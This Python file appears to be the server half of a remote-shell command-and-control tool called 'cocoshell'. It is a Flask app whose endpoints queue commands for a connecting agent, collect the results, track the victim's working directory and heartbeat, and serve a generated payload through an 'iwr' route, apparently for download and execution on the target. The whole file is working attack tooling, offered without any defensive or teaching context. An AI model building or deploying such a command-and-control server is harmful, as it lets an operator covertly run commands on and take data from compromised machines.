import logging, sqlite3, argparse, sys, datetime
from os.path import exists
from multiprocessing import Process
from flask import Flask, session, request
from werkzeug.exceptions import BadRequest
from payload import *
from db import Db

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
parser.add_argument("-u", "--url", help="the url the agent will connect to")
parser.add_argument("-f", "--frequency", help="the amount of seconds the agent waits for the next command (default: 1)")
parser.add_argument("-db", "--database", help="the sqlite3 database to use")
args, leftovers = parser.parse_known_args()

route = args.route
frequency = args.frequency if args.frequency is not None else 1
dbname = args.database if args.database is not None else "cocoshell.db"
db = Db(dbname)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
api = Flask(__name__)
#print(route, file=sys.stderr)

@api.route('/' + route + '/<cmd>', methods=['GET', 'POST'])
def command_handling(cmd):
    if cmd == 'get':
        last = db.is_command_available()
        if last[3] == 1:
            return ''
        else:
            if last[1] == "exit-agent":
                db.reset_agent()
            return last[1]
    if cmd == 'post':
        db.set_result(request.data.decode())
        return ''
    if cmd == 'pwd':
        pwd = request.data.decode()
        if pwd == "":
            return db.get_pwd()
        if pwd is not None:
            db.set_pwd(pwd)
            return ''
    if cmd == "pulse":
        return db.set_heartbeat()
    if cmd == "iwr":
        return generate_payload(args.url, frequency)
        
        
if __name__ == '__main__':
    try:
        api.run()
    except KeyboardInterrupt:
        exit